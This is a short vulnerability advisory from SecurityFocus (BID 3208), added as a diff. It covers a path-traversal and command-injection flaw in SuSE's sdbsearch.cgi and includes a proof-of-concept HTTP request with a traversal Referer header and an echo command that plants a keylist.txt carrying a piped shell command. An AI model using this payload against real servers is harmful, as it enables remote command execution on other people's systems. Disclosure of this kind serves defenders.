@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/3208/info
+
+An input validation error exists in sdb, the SuSE Support Data Base.
+
+The problem exists in the sdbsearch.cgi script, which uses data directly from the 'Referer' header field from a HTTP request as a path when opening it's "keylist.txt" file. The keylist file contains a list of keywords and associated files, which are opened using Perl's open() command.
+
+If an attacker is able to create a malicious "keylist.txt" file on a vulnerable host, it may be possible for the attacker to cause arbitrary commands to be executed by the sdbsearch.cgi script. 
+
+Proof of concept is very simple, just create harmful keylist.txt for instance in /tmp directory and send request to http server like this:
+
+GET /cgi-bin/sdbsearch.cgi?stichwort=keyword HTTP/1.0
+Referer: http://szachy.org/../../../../../tmp
+
+(very deep traversal because we don't know what is DOCUMENT_ROOT)
+
+and an example content of our /tmp/keylist.txt create like this:
+$ echo -e "keyword\0touch exploitable|" > /tmp/keylist.txt
+
+After successful attempt there will be "exploitable" file in /tmp directory. 
